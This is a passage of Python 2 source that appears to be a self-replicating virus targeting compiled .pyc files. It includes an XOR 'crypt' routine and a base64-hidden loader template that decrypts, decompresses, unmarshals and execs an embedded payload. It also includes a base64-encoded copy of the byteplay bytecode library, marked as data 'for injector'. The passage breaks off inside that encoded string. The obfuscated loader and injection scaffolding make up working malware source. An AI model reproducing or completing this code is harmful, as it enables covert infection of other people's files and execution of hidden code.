signature = "PY_2.6"
# -*- coding: utf-8 -*-

import socket
import marshal
import zlib
import glob
from base64 import b64decode, b64encode
import random


def crypt(clear):
    key = chr(random.randint(0, 255))
    crypted = "".join(chr(ord(c) ^ ord(key)) for c in clear)

    return key + crypted


if __file__.endswith('.pyc'):
    template = b64decode("c2lnbmF0dXJlID0gIlBZXzIuNiIKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KCmltcG9ydCB6bGliCmltcG9ydCBiYXNlNjQKaW1wb3J0IG1hcnNoYWwKCl9fREVDUllQVF9QTEFDRUhPTERFUl9fCgpwYXlsb2FkID0gIl9fUEFZTE9BRF9QTEFDRUhPTERFUl9fIgoKIyBkZS1iNjQgc3RlcApkZWI2NCA9IGJhc2U2NC5iNjRkZWNvZGUocGF5bG9hZCkKCiMgZGUtY3J5cHQgc3RlcApkZWNyeXB0ID0gZGVjcnlwdChkZWI2NCkKCiMgZGUtY29tcHJlc3Mgc3RlcApkZWNvbXByZXNzID0gemxpYi5kZWNvbXByZXNzKGRlY3J5cHQpCgojIGRlLW1hcnNoYWwgc3RlcApkZW1hcnNoYWwgPSBtYXJzaGFsLmxvYWRzKGRlY29tcHJlc3MpCgojIGV4ZWMKZXhlYyBkZW1hcnNoYWwKCnNpZ25hdHVyZSA9ICJQWV8yLjYiCg==")
    template = template.replace("__DECRYPT_PLACEHOLDER__", """
def decrypt(crypted):
    key = crypted[0]

    return "".join(chr(ord(c) ^ ord(key)) for c in crypted[1:])
""")



    # ------------- GENERATING BYTEPLAY DATA (for injector) ---------------
    Code = None
    CodeList = None
    EXEC_STMT = None
    exec b64decode("IyBieXRlcGxheSAtIFB5dGhvbiBieXRlY29kZSBhc3NlbWJsZXIvZGlzYXNzZW1ibGVyLgojIENvcHlyaWdodCAoQykgMjAwNi0yMDEwIE5vYW0gWW9yYXYtUmFwaGFlbAojIEhvbWVwYWdlOiBodHRwOi8vY29kZS5nb29nbGUuY29tL3AvYnl0ZXBsYXkKIwojIFRoaXMgbGlicmFyeSBpcyBmcmVlIHNvZnR3YXJlOyB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3IKIyBtb2RpZnkgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgTGVzc2VyIEdlbmVyYWwgUHVibGljCiMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbjsgZWl0aGVyCiMgdmVyc2lvbiAyLjEgb2YgdGhlIExpY2Vuc2UsIG9yIChhdCB5b3VyIG9wdGlvbikgYW55IGxhdGVyIHZlcnNpb24uCiMKIyBUaGlzIGxpYnJhcnkgaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKIyBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgojIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUgR05VCiMgTGVzc2VyIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgZm9yIG1vcmUgZGV0YWlscy4KIwojIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBMZXNzZXIgR2VuZXJhbCBQdWJsaWMKIyBMaWNlbnNlIGFsb25nIHdpdGggdGhpcyBsaWJyYXJ5OyBpZiBub3QsIHdyaXRlIHRvIHRoZSBGcmVlIFNvZnR3YXJlCiMgRm91bmRhdGlvbiwgSW5jLiwgNTEgRnJhbmtsaW4gU3RyZWV0LCBGaWZ0aCBGbG9vciwgQm9zdG9uLCBNQSAgMDIxMTAtMTMwMSAgVVNBCgojIE1hbnkgdGhhbmtzIHRvIEdyZWcgWCBmb3IgYWRkaW5nIHN1cHBvcnQgZm9yIFB5dGhvbiAyLjYgYW5kIDIuNyEKCl9fdmVyc2lvbl9fID0gJzAuMicKCl9fYWxsX18gPSBbJ29wbWFwJywgJ29wbmFtZScsICdvcGNvZGVzJywKICAgICAgICAgICAnY21wX29wJywgJ2hhc2FyZycsICdoYXNuYW1lJywgJ2hhc2pyZWwnLCAnaGFzamFicycsCiAgICAgICAgICAgJ2hhc2p1bXAnLCAnaGFzbG9jYWwnLCAnaGFzY29tcGFyZScsICdoYXNmcmVlJywgJ2hhc2NvZGUnLAogICAgICAgICAgICdoYXNmbG93JywgJ2dldHNlJywKICAgICAgICAgICAnT3Bjb2RlJywgJ1NldExpbmVubycsICdMYWJlbCcsICdpc29wY29kZScsICdDb2RlJywKICAgICAgICAgICAnQ29kZUxpc3QnLCAncHJpbnRjb2RlbGlzdCddCgppbXBvcnQgb3Bjb2RlCmZyb20gZGlzIGltcG9ydCBmaW5kbGFiZWxzCmltcG9ydCB0eXBlcwpmcm9tIGFycmF5IGltcG9ydCBhcnJheQppbXBvcnQgb3BlcmF0b3IKaW1wb3J0IGl0ZXJ0b29scwppbXBvcnQgc3lzCmltcG9ydCB3YXJuaW5ncwpmcm9tIGNTdHJpbmdJTyBpbXBvcnQgU3RyaW5nSU8KCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBEZWZpbmUgb3Bjb2RlcyBhbmQgaW5mb3JtYXRpb24gYWJvdXQgdGhlbQoKcHl0aG9uX3ZlcnNpb24gPSAnLicuam9pbihzdHIoeCkgZm9yIHggaW4gc3lzLnZlcnNpb25faW5mb1s6Ml0pCmlmIHB5dGhvbl92ZXJzaW9uIG5vdCBpbiAoJzIuNCcsICcyLjUnLCAnMi42JywgJzIuNycpOgogICAgd2FybmluZ3Mud2FybigiYnl0ZXBsYXkgZG9lc24ndCBzdXBwb3J0IFB5dGhvbiB2ZXJzaW9uICIgKyBweXRob25fdmVyc2lvbikKCgpjbGFzcyBPcGNvZGUoaW50KToKICAgICIiIkFuIGludCB3aGljaCByZXByZXNlbnRzIGFuIG9wY29kZSAtIGhhcyBhIG5pY2VyIHJlcHIuIiIiCgogICAgZGVmIF9fcmVwcl9fKHNlbGYpOgogICAgICAgIHJldHVybiBvcG5hbWVbc2VsZl0KCiAgICBfX3N0cl9fID0gX19yZXByX18KCgpjbGFzcyBDb2RlTGlzdChsaXN0KToKICAgICIiIkEgbGlzdCBmb3Igc3RvcmluZyBvcGNvZGUgdHVwbGVzIC0gaGFzIGEgbmljZXIgX19zdHJfXy4iIiIKCiAgICBkZWYgX19zdHJfXyhzZWxmKToKICAgICAgICBmID0gU3RyaW5nSU8oKQogICAgICAgIHByaW50Y29kZWxpc3Qoc2VsZiwgZikKICAgICAgICByZXR1cm4gZi5nZXR2YWx1ZSgpCgoKb3BtYXAgPSBkaWN0KChuYW1lLnJlcGxhY2UoJysnLCAnXycpLCBPcGNvZGUoY29kZSkpCiAgICBmb3IgbmFtZSwgY29kZSBpbiBvcGNvZGUub3BtYXAuaXRlcml0ZW1zKCkKICAgIGlmIG5hbWUgIT0gJ0VYVEVOREVEX0FSRycpCm9wbmFtZSA9IGRpY3QoKGNvZGUsIG5hbWUpIGZvciBuYW1lLCBjb2RlIGluIG9wbWFwLml0ZXJpdGVtcygpKQpvcGNvZGVzID0gc2V0KG9wbmFtZSkKCgpkZWYgZ2xvYmFsaXplX29wY29kZXMoKToKICAgIGZvciBuYW1lLCBjb2RlIGluIG9wbWFwLml0ZXJpdGVtcygpOgogICAgICAgIGdsb2JhbHMoKVtuYW1lXSA9IGNvZGUKICAgICAgICBfX2FsbF9fLmFwcGVuZChuYW1lKQoKCmdsb2JhbGl6ZV9vcGNvZGVzKCkKCmNtcF9vcCA9IG9wY29kZS5jbXBfb3AKCmhhc2FyZyA9IHNldCh4IGZvciB4IGluIG9wY29kZXMgaWYgeCA+PSBvcGNvZGUuSEFWRV9BUkdVTUVOVCkKaGFzY29uc3QgPSBzZXQoT3Bjb2RlKHgpIGZvciB4IGluIG9wY29kZS5oYXNjb25zdCkKaGFzbmFtZSA9IHNldChPcGNvZGUoeCkgZm9yIHggaW4gb3Bjb2RlLmhhc25hbWUpCmhhc2pyZWwgPSBzZXQoT3Bjb2RlKHgpIGZvciB4IGluIG9wY29kZS5oYXNqcmVsKQpoYXNqYWJzID0gc2V0KE9wY29kZSh4KSBmb3IgeCBpbiBvcGNvZGUuaGFzamFicykKaGFzanVtcCA9IGhhc2pyZWwudW5pb24oaGFzamFicykKaGFzbG9jYWwgPSBzZXQoT3Bjb2RlKHgpIGZvciB4IGluIG9wY29kZS5oYXNsb2NhbCkKaGFzY29tcGFyZSA9IHNldChPcGNvZGUoeCkgZm9yIHggaW4gb3Bjb2RlLmhhc2NvbXBhcmUpCmhhc2ZyZWUgPSBzZXQoT3Bjb2RlKHgpIGZvciB4IGluIG9wY29kZS5oYXNmcmVlKQpoYXNjb2RlID0gc2V0KFtNQUtFX0ZVTkNUSU9OLCBNQUtFX0NMT1NVUkVdKQoKCmNsYXNzIF9zZToKICAgICIiIlF1aWNrIHdheSBvZiBkZWZpbmluZyBzdGF0aWMgc3RhY2sgZWZmZWN0cyBvZiBvcGNvZGVzIiIiCiAgICAjIFRha2VuIGZyb20gYXNzZW1ibGVyLnB5IGJ5IFBoaWxsaXAgSi4gRWJ5CiAgICBOT1AgPSAwLCAwCgogICAgUE9QX1RPUCA9IDEsIDAKICAgIFJPVF9UV08gPSAyLCAyCiAgICBST1RfVEhSRUUgPSAzLCAzCiAgICBST1RfRk9VUiA9IDQsIDQKICAgIERVUF9UT1AgPSAxLCAyCgogICAgVU5BUllfUE9TSVRJVkUgPSBVTkFSWV9ORUdBVElWRSA9IFVOQVJZX05PVCA9IFVOQVJZX0NPTlZFUlQgPSBcCiAgICAgICAgVU5BUllfSU5WRVJUID0gR0VUX0lURVIgPSBMT0FEX0FUVFIgPSAxLCAxCgogICAgSU1QT1JUX0ZST00gPSAxLCAyCgogICAgQklOQVJZX1BPV0VSID0gQklOQVJZX01VTFRJUExZID0gQklOQVJZX0RJVklERSA9IEJJTkFSWV9GTE9PUl9ESVZJREUgPSBcCiAgICAgICAgQklOQVJZX1RSVUVfRElWSURFID0gQklOQVJZX01PRFVMTyA9IEJJTkFSWV9BREQgPSBCSU5BUllfU1VCVFJBQ1QgPSBcCiAgICAgICAgQklOQVJZX1NVQlNDUiA9IEJJTkFSWV9MU0hJRlQgPSBCSU5BUllfUlNISUZUID0gQklOQVJZX0FORCA9IFwKICAgICAgICBCSU5BUllfWE9SID0gQklOQVJZX09SID0gQ09NUEFSRV9PUCA9IDIsIDEKCiAgICBJTlBMQUNFX1BPV0VSID0gSU5QTEFDRV9NVUxUSVBMWSA9IElOUExBQ0VfRElWSURFID0gXAogICAgICAgIElOUExBQ0VfRkxPT1JfRElWSURFID0gSU5QTEFDRV9UUlVFX0RJVklERSA9IElOUExBQ0VfTU9EVUxPID0gXAogICAgICAgIElOUExBQ0VfQUREID0gSU5QTEFDRV9TVUJUUkFDVCA9IElOUExBQ0VfTFNISUZUID0gSU5QTEFDRV9SU0hJRlQgPSBcCiAgICAgICAgSU5QTEFDRV9BTkQgPSBJTlBMQUNFX1hPUiA9IElOUExBQ0VfT1IgPSAyLCAxCgogICAgU0xJQ0VfMCwgU0xJQ0VfMSwgU0xJQ0VfMiwgU0xJQ0VfMyA9IFwKICAgICAgICAoMSwgMSksICgyLCAxKSwgKDIsIDEpLCAoMywgMSkKICAgIFNUT1JFX1NMSUNFXzAsIFNUT1JFX1NMSUNFXzEsIFNUT1JFX1NMSUNFXzIsIFNUT1JFX1NMSUNFXzMgPSBcCiAgICAgICAgKDIsIDApLCAoMywgMCksICgzLCAwKSwgKDQsIDApCiAgICBERUxFVEVfU0xJQ0VfMCwgREVMRVRFX1NMSUNFXzEsIERFTEVURV9TTElDRV8yLCBERUxFVEVfU0xJQ0VfMyA9IFwKICAgICAgICAoMSwgMCksICgyLCAwKSwgKDIsIDApLCAoMywgMCkKCiAgICBTVE9SRV9TVUJTQ1IgPSAzLCAwCiAgICBERUxFVEVfU1VCU0NSID0gU1RPUkVfQVRUUiA9IDIsIDAKICAgIERFTEVURV9BVFRSID0gU1RPUkVfREVSRUYgPSAxLCAwCiAgICBQUklOVF9ORVdMSU5FID0gMCwgMAogICAgUFJJTlRfRVhQUiA9IFBSSU5UX0lURU0gPSBQUklOVF9ORVdMSU5FX1RPID0gSU1QT1JUX1NUQVIgPSAxLCAwCiAgICBTVE9SRV9OQU1FID0gU1RPUkVfR0xPQkFMID0gU1RPUkVfRkFTVCA9IDEsIDAKICAgIFBSSU5UX0lURU1fVE8gPSAyLCAwCgogICAgTE9BRF9MT0NBTFMgPSBMT0FEX0NPTlNUID0gTE9BRF9OQU1FID0gTE9BRF9HTE9CQUwgPSBMT0FEX0ZBU1QgPSBcCiAgICAgICAgTE9BRF9DTE9TVVJFID0gTE9BRF9ERVJFRiA9IEJVSUxEX01BUCA9IDAsIDEKCiAgICBERUxFVEVfRkFTVCA9IERFTEVURV9HTE9CQUwgPSBERUxFVEVfTkFNRSA9IDAsIDAKCiAgICBFWEVDX1NUTVQgPSAzLCAwCiAgICBCVUlMRF9DTEFTUyA9IDMsIDEKCiAgICBTVE9SRV9NQVAgPSBNQVBfQUREID0gMiwgMAogICAgU0VUX0FERCA9IDEsIDAKCiAgICBpZiBweXRob25fdmVyc2lvbiA9PSAnMi40JzoKICAgICAgICBZSUVMRF9WQUxVRSA9IDEsIDAKICAgICAgICBJTVBPUlRfTkFNRSA9IDEsIDEKICAgICAgICBMSVNUX0FQUEVORCA9IDIsIDAKICAgIGVsaWYgcHl0aG9uX3ZlcnNpb24gPT0gJzIuNSc6CiAgICAgICAgWUlFTERfVkFMVUUgPSAxLCAxCiAgICAgICAgSU1QT1JUX05BTUUgPSAyLCAxCiAgICAgICAgTElTVF9BUFBFTkQgPSAyLCAwCiAgICBlbGlmIHB5dGhvbl92ZXJzaW9uID09ICcyLjYnOgogICAgICAgIFlJRUxEX1ZBTFVFID0gMSwgMQogICAgICAgIElNUE9SVF9OQU1FID0gMiwgMQogICAgICAgIExJU1RfQVBQRU5EID0gMiwgMAogICAgZWxpZiBweXRob25fdmVyc2lvbiA9PSAnMi43JzoKICAgICAgICBZSUVMRF9WQUxVRSA9IDEsIDEKICAgICAgICBJTVBPUlRfTkFNRSA9IDIsIDEKICAgICAgICBMSVNUX0FQUEVORCA9IDEsIDAKCgpfc2UgPSBkaWN0KChvcCwgZ2V0YXR0cihfc2UsIG9wbmFtZVtvcF0pKQogICAgZm9yIG9wIGluIG9wY29kZXMKICAgIGlmIGhhc2F0dHIoX3NlLCBvcG5hbWVbb3BdKSkKCmhhc2Zsb3cgPSBvcGNvZGVzIC0gc2V0KF9zZSkgLSBcCiAgICAgICAgICBzZXQoW0NBTExfRlVOQ1RJT04sIENBTExfRlVOQ1RJT05fVkFSLCBDQUxMX0ZVTkNUSU9OX0tXLAogICAgICAgICAgICAgICBDQUxMX0ZVTkNUSU9OX1ZBUl9LVywgQlVJTERfVFVQTEUsIEJVSUxEX0xJU1QsCiAgICAgICAgICAgICAgIFVOUEFDS19TRVFVRU5DRSwgQlVJTERfU0xJQ0UsIERVUF9UT1BYLAogICAgICAgICAgICAgICBSQUlTRV9WQVJBUkdTLCBNQUtFX0ZVTkNUSU9OLCBNQUtFX0NMT1NVUkVdKQppZiBweXRob25fdmVyc2lvbiA9PSAnMi43JzoKICAgIGhhc2Zsb3cgPSBoYXNmbG93IC0gc2V0KFtCVUlMRF9TRVRdKQoKCmRlZiBnZXRzZShvcCwgYXJnPU5vbmUpOgogICAgIiIiR2V0IHRoZSBzdGFjayBlZmZlY3Qgb2YgYW4gb3Bjb2RlLCBhcyBhIChwb3AsIHB1c2gpIHR1cGxlLgoKICAgIElmIGFuIGFyZyBpcyBuZWVkZWQgYW5kIGlzIG5vdCBnaXZlbiwgYSBWYWx1ZUVycm9yIGlzIHJhaXNlZC4KICAgIElmIG9wIGlzbid0IGEgc2ltcGxlIG9wY29kZSwgdGhhdCBpcywgdGhlIGZsb3cgZG9lc24ndCBhbHdheXMgY29udGludWUKICAgIHRvIHRoZSBuZXh0IG9wY29kZSwgYSBWYWx1ZUVycm9yIGlzIHJhaXNlZC4KICAgICIiIgogICAgdHJ5OgogICAgICAgIHJldHVybiBfc2Vbb3BdCiAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgIyBDb250aW51ZSB0byBvcGNvZGVzIHdpdGggYW4gZWZmZWN0IHRoYXQgZGVwZW5kcyBvbiBhcmcKICAgICAgICBwYXNzCgogICAgaWYgYXJnIGlzIE5vbmU6CiAgICAgICAgcmFpc2UgVmFsdWVFcnJvciwgIk9wY29kZSBzdGFjayBiZWhhdmlvdXIgZGVwZW5kcyBvbiBhcmciCgogICAgZGVmIGdldF9mdW5jX3R1cChhcmcsIG5leHRyYSk6CiAgICAgICAgaWYgYXJnID4gMHhGRkZGOgogICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yLCAiQ2FuIG9ubHkgc3BsaXQgYSB0d28tYnl0ZSBhcmd1bWVudCIKICAgICAgICByZXR1cm4gKG5leHRyYSArIDEgKyAoYXJnICYgMHhGRikgKyAyICogKChhcmcgPj4gOCkgJiAweEZGKSwKICAgICAgICAgICAgICAgIDEpCgogICAgaWYgb3AgPT0gQ0FMTF9GVU5DVElPTjoKICAgICAgICByZXR1cm4gZ2V0X2Z1bmNfdHVwKGFyZywgMCkKICAgIGVsaWYgb3AgPT0gQ0FMTF9GVU5DVElPTl9WQVI6CiAgICAgICAgcmV0dXJuIGdldF9mdW5jX3R1cChhcmcsIDEpCiAgICBlbGlmIG9wID09IENBTExfRlVOQ1RJT05fS1c6CiAgICAgICAgcmV0dXJuIGdldF9mdW5jX3R1cChhcmcsIDEpCiAgICBlbGlmIG9wID09IENBTExfRlVOQ1RJT05fVkFSX0tXOgogICAgICAgIHJldHVybiBnZXRfZnVuY190dXAoYXJnLCAyKQoKICAgIGVsaWYgb3AgPT0gQlVJTERfVFVQTEU6CiAgICAgICAgcmV0dXJuIGFyZywgMQogICAgZWxpZiBvcCA9PSBCVUlMRF9MSVNUOgogICAgICAgIHJldHVybiBhcmcsIDEKICAgIGVsaWYgcHl0aG9uX3ZlcnNpb24gPT0gJzIuNycgYW5kIG9wID09IEJVSUxEX1NFVDoKICAgICAgICByZXR1cm4gYXJnLCAxCiAgICBlbGlmIG9wID09IFVOUEFDS19TRVFVRU5DRToKICAgICAgICByZXR1cm4gMSwgYXJnCiAgICBlbGlmIG9wID09IEJVSUxEX1NMSUNFOgogICAgICAgIHJldHVybiBhcmcsIDEKICAgIGVsaWYgb3AgPT0gRFVQX1RPUFg6CiAgICAgICAgcmV0dXJuIGFyZywgYXJnICogMgogICAgZWxpZiBvcCA9PSBSQUlTRV9WQVJBUkdTOgogICAgICAgIHJldHVybiAxICsgYXJnLCAxCiAgICBlbGlmIG9wID09IE1BS0VfRlVOQ1RJT046CiAgICAgICAgcmV0dXJuIDEgKyBhcmcsIDEKICAgIGVsaWYgb3AgPT0gTUFLRV9DTE9TVVJFOgogICAgICAgIGlmIHB5dGhvbl92ZXJzaW9uID09ICcyLjQnOgogICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yLCAiVGhlIHN0YWNrIGVmZmVjdCBvZiBNQUtFX0NMT1NVUkUgZGVwZW5kcyBvbiBUT1MiCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIDIgKyBhcmcsIDEKICAgIGVsc2U6CiAgICAgICAgcmFpc2UgVmFsdWVFcnJvciwgIlRoZSBvcGNvZGUgJXIgaXNuJ3QgcmVjb2duaXplZCBvciBoYXMgYSBzcGVjaWFsICIgXAogICAgICAgICAgICAgICAgICAgICAgICAgICJmbG93IGNvbnRyb2wiICUgb3AKCgpjbGFzcyBTZXRMaW5lbm9UeXBlKG9iamVjdCk6CiAgICBkZWYgX19yZXByX18oc2VsZik6CiAgICAgICAgcmV0dXJuICdTZXRMaW5lbm8nCgoKU2V0TGluZW5vID0gU2V0TGluZW5vVHlwZSgpCgoKY2xhc3MgTGFiZWwob2JqZWN0KToKICAgIHBhc3MKCgpkZWYgaXNvcGNvZGUob2JqKToKICAgICIiIlJldHVybiB3aGV0aGVyIG9iaiBpcyBhbiBvcGNvZGUgLSBub3QgU2V0TGluZW5vIG9yIExhYmVsIiIiCiAgICByZXR1cm4gb2JqIGlzIG5vdCBTZXRMaW5lbm8gYW5kIG5vdCBpc2luc3RhbmNlKG9iaiwgTGFiZWwpCgojIEZsYWdzIGZyb20gY29kZS5oCkNPX09QVElNSVpFRCA9IDB4MDAwMSAgICAgICMgdXNlIExPQUQvU1RPUkVfRkFTVCBpbnN0ZWFkIG9mIF9OQU1FCkNPX05FV0xPQ0FMUyA9IDB4MDAwMiAgICAgICMgb25seSBjbGVhcmVkIGZvciBtb2R1bGUvZXhlYyBjb2RlCkNPX1ZBUkFSR1MgPSAweDAwMDQKQ09fVkFSS0VZV09SRFMgPSAweDAwMDgKQ09fTkVTVEVEID0gMHgwMDEwICAgICAgIyA/Pz8KQ09fR0VORVJBVE9SID0gMHgwMDIwCkNPX05PRlJFRSA9IDB4MDA0MCAgICAgICMgc2V0IGlmIG5vIGZyZWUgb3IgY2VsbCB2YXJzCkNPX0dFTkVSQVRPUl9BTExPV0VEID0gMHgxMDAwICAgICAgIyB1bnVzZWQKIyBUaGUgZnV0dXJlIGZsYWdzIGFyZSBvbmx5IHVzZWQgb24gY29kZSBnZW5lcmF0aW9uLCBzbyB3ZSBjYW4gaWdub3JlIHRoZW0uCiMgKEl0IGRvZXMgY2F1c2Ugc29tZSB3YXJuaW5ncywgdGhvdWdoLikKQ09fRlVUVVJFX0RJVklTSU9OID0gMHgyMDAwCkNPX0ZVVFVSRV9BQlNPTFVURV9JTVBPUlQgPSAweDQwMDAKQ09fRlVUVVJFX1dJVEhfU1RBVEVNRU5UID0gMHg4MDAwCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIERlZmluZSB0aGUgQ29kZSBjbGFzcwoKY2xhc3MgQ29kZShvYmplY3QpOgogICAgIiIiQW4gb2JqZWN0IHdoaWNoIGhvbGRzIGFsbCB0aGUgaW5mb3JtYXRpb24gd2hpY2ggYSBQeXRob24gY29kZSBvYmplY3QKICAgIGhvbGRzLCBidXQgaW4gYW4gZWFzeS10by1wbGF5LXdpdGggcmVwcmVzZW50YXRpb24uCgogICAgVGhlIGF0dHJpYnV0ZXMgYXJlOgoKICAgIEFmZmVjdGluZyBhY3Rpb24KICAgIC0tLS0tLS0tLS0tLS0tLS0KICAgIGNvZGUgLSBsaXN0IG9mIDItdHVwbGVzOiB0aGUgY29kZQogICAgZnJlZXZhcnMgLSBsaXN0IG9mIHN0cmluZ3M6IHRoZSBmcmVlIHZhcnMgb2YgdGhlIGNvZGUgKHRob3NlIGFyZSBuYW1lcwogICAgICAgICAgICAgICBvZiB2YXJpYWJsZXMgY3JlYXRlZCBpbiBvdXRlciBmdW5jdGlvbnMgYW5kIHVzZWQgaW4gdGhlIGZ1bmN0aW9uKQogICAgYXJncyAtIGxpc3Qgb2Ygc3RyaW5nczogdGhlIGFyZ3VtZW50cyBvZiB0aGUgY29kZQogICAgdmFyYXJncyAtIGJvb2xlYW46IERvZXMgYXJncyBlbmQgd2l0aCBhICcqYXJncycgYXJndW1lbnQKICAgIHZhcmt3YXJncyAtIGJvb2xlYW46IERvZXMgYXJncyBlbmQgd2l0aCBhICcqKmt3YXJncycgYXJndW1lbnQKICAgIG5ld2xvY2FscyAtIGJvb2xlYW46IFNob3VsZCBhIG5ldyBsb2NhbCBuYW1lc3BhY2UgYmUgY3JlYXRlZC4KICAgICAgICAgICAgICAgIChUcnVlIGluIGZ1bmN0aW9ucywgRmFsc2UgZm9yIG1vZHVsZSBhbmQgZXhlYyBjb2RlKQoKICAgIE5vdCBhZmZlY3RpbmcgYWN0aW9uCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgbmFtZSAtIHN0cmluZzogdGhlIG5hbWUgb2YgdGhlIGNvZGUgKGNvX25hbWUpCiAgICBmaWxlbmFtZSAtIHN0cmluZzogdGhlIGZpbGUgbmFtZSBvZiB0aGUgY29kZSAoY29fZmlsZW5hbWUpCiAgICBmaXJzdGxpbmVubyAtIGludDogdGhlIGZpcnN0IGxpbmUgbnVtYmVyIChjb19maXJzdGxpbmVubykKICAgIGRvY3N0cmluZyAtIHN0cmluZyBvciBOb25lOiB0aGUgZG9jc3RyaW5nICh0aGUgZmlyc3QgaXRlbSBvZiBjb19jb25zdHMsCiAgICAgICAgICAgICAgICBpZiBpdCdzIHN0ciBvciB1bmljb2RlKQoKICAgIGNvZGUgaXMgYSBsaXN0IG9mIDItdHVwbGVzLiBUaGUgZmlyc3QgaXRlbSBpcyBhbiBvcGNvZGUsIG9yIFNldExpbmVubywgb3IgYQogICAgTGFiZWwgaW5zdGFuY2UuIFRoZSBzZWNvbmQgaXRlbSBpcyB0aGUgYXJndW1lbnQsIGlmIGFwcGxpY2FibGUsIG9yIE5vbmUuCiAgICBjb2RlIGNhbiBiZSBhIENvZGVMaXN0IGluc3RhbmNlLCB3aGljaCB3aWxsIHByb2R1Y2UgbmljZXIgb3V0cHV0IHdoZW4KICAgIGJlaW5nIHByaW50ZWQuCiAgICAiIiIKCiAgICBkZWYgX19pbml0X18oc2VsZiwgY29kZSwgZnJlZXZhcnMsIGFyZ3MsIHZhcmFyZ3MsIHZhcmt3YXJncywgbmV3bG9jYWxzLAogICAgICAgICAgICAgICAgIG5hbWUsIGZpbGVuYW1lLCBmaXJzdGxpbmVubywgZG9jc3RyaW5nKToKICAgICAgICBzZWxmLmNvZGUgPSBjb2RlCiAgICAgICAgc2VsZi5mcmVldmFycyA9IGZyZWV2YXJzCiAgICAgICAgc2VsZi5hcmdzID0gYXJncwogICAgICAgIHNlbGYudmFyYXJncyA9IHZhcmFyZ3MKICAgICAgICBzZWxmLnZhcmt3YXJncyA9IHZhcmt3YXJncwogICAgICAgIHNlbGYubmV3bG9jYWxzID0gbmV3bG9jYWxzCiAgICAgICAgc2VsZi5uYW1lID0gbmFtZQogICAgICAgIHNlbGYuZmlsZW5hbWUgPSBmaWxlbmFtZQogICAgICAgIHNlbGYuZmlyc3RsaW5lbm8gPSBmaXJzdGxpbmVubwogICAgICAgIHNlbGYuZG9jc3RyaW5nID0gZG9jc3RyaW5nCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIF9maW5kbGluZXN0YXJ0cyhjb2RlKToKICAgICAgICAiIiJGaW5kIHRoZSBvZmZzZXRzIGluIGEgYnl0ZSBjb2RlIHdoaWNoIGFyZSBzdGFydCBvZiBsaW5lcyBpbiB0aGUKICAgICAgICBzb3VyY2UuCgogICAgICAgIEdlbmVyYXRlIHBhaXJzIChvZmZzZXQsIGxpbmVubykgYXMgZGVzY3JpYmVkIGluIFB5dGhvbi9jb21waWxlLmMuCgogICAgICAgIFRoaXMgaXMgYSBtb2RpZmllZCB2ZXJzaW9uIG9mIGRpcy5maW5kbGluZXN0YXJ0cywgd2hpY2ggYWxsb3dzIG11bHRpcGxlCiAgICAgICAgImxpbmUgc3RhcnRzIiB3aXRoIHRoZSBzYW1lIGxpbmUgbnVtYmVyLgogICAgICAgICIiIgogICAgICAgIGJ5dGVfaW5jcmVtZW50cyA9IFtvcmQoYykgZm9yIGMgaW4gY29kZS5jb19sbm90YWJbMDo6Ml1dCiAgICAgICAgbGluZV9pbmNyZW1lbnRzID0gW29yZChjKSBmb3IgYyBpbiBjb2RlLmNvX2xub3RhYlsxOjoyXV0KCiAgICAgICAgbGluZW5vID0gY29kZS5jb19maXJzdGxpbmVubwogICAgICAgIGFkZHIgPSAwCiAgICAgICAgZm9yIGJ5dGVfaW5jciwgbGluZV9pbmNyIGluIHppcChieXRlX2luY3JlbWVudHMsIGxpbmVfaW5jcmVtZW50cyk6CiAgICAgICAgICAgIGlmIGJ5dGVfaW5jcjoKICAgICAgICAgICAgICAgIHlpZWxkIChhZGRyLCBsaW5lbm8pCiAgICAgICAgICAgICAgICBhZGRyICs9IGJ5dGVfaW5jcgogICAgICAgICAgICBsaW5lbm8gKz0gbGluZV9pbmNyCiAgICAgICAgeWllbGQgKGFkZHIsIGxpbmVubykKCiAgICBAY2xhc3NtZXRob2QKICAgIGRlZiBmcm9tX2NvZGUoY2xzLCBjbyk6CiAgICAgICAgIiIiRGlzYXNzZW1ibGUgYSBQeXRob24gY29kZSBvYmplY3QgaW50byBhIENvZGUgb2JqZWN0LiIiIgogICAgICAgIGNvX2NvZGUgPSBjby5jb19jb2RlCiAgICAgICAgbGFiZWxzID0gZGljdCgoYWRkciwgTGFiZWwoKSkgZm9yIGFkZHIgaW4gZmluZGxhYmVscyhjb19jb2RlKSkKICAgICAgICBsaW5lc3RhcnRzID0gZGljdChjbHMuX2ZpbmRsaW5lc3RhcnRzKGNvKSkKICAgICAgICBjZWxsZnJlZSA9IGNvLmNvX2NlbGx2YXJzICsgY28uY29fZnJlZXZhcnMKCiAgICAgICAgY29kZSA9IENvZGVMaXN0KCkKICAgICAgICBuID0gbGVuKGNvX2NvZGUpCiAgICAgICAgaSA9IDAKICAgICAgICBleHRlbmRlZF9hcmcgPSAwCiAgICAgICAgd2hpbGUgaSA8IG46CiAgICAgICAgICAgIG9wID0gT3Bjb2RlKG9yZChjb19jb2RlW2ldKSkKICAgICAgICAg